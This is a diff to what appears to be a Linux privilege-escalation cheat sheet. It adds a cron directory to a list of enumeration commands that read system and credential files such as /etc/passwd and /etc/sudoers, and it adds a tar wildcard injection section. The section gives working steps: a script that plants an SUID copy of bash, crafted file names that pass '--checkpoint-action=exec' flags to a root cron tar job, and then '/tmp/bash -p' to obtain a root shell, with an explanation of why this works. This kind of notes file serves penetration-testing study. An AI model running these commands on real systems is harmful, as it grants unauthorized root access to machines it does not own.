@@ -40,13 +40,14 @@ cat /etc/passwd | grep -i 'sh$'   # list users
 # Quick files to Check
 ```bash
 ls -la /etc/systemd/system
+ls -la /etc/cron.d/
 cat /etc/resolv.conf
 /usr/bin/env   or  /usr/bin/printenv
 cat /etc/*-release
 cat /etc/passwd
 cat /etc/sudoers
-/usr/bin/w or w  # show Current logins
-last -n 5         # show last 5 logins
+/usr/bin/w or w     # show Current logins
+last -n 5           # show last 5 logins
 ```
 
 
@@ -161,6 +162,32 @@ grep -ri --include="*.xml" -n "Password" /opt 2>/dev/null
  # Writeable Cron Jobs Dependency (Files, python library, config files...)
 ```
 > Adding soon........!!!
+
+# Wildcard Priv. Esc
+### Tar Wildcard Injection
+```bash
+# DETECTION
+cat /etc/cron.d/Cron_Name_Here
+# * * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
+#                                                                    ^
+#                                                runs as root + wildcard in writable directory
+
+# EXPLOITATION
+cd /opt/backups
+# payload: creates SUID bash
+echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh         
+touch -- '--checkpoint=1'                        # creates a file named --checkpoint=1
+touch -- '--checkpoint-action=exec=sh shell.sh'  # creates a file named --checkpoint-action=exec=sh shell.sh
+
+# Wait for cron to run, then:
+/tmp/bash -p        # -p preserves root effective UID
+
+# BEHIND THE SCENES
+# Shell expands * into all filenames before tar runs, so tar sees:
+tar czf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh
+#                                 ↑ these are actually filenames, but tar treats them as real flags
+#                                   --checkpoint-action tells tar to execute shell.sh as root
+```
 
 # Automation
 > Linux Smart Enumeration Script [lse](https://github.com/diego-treitos/linux-smart-enumeration/tree/master)
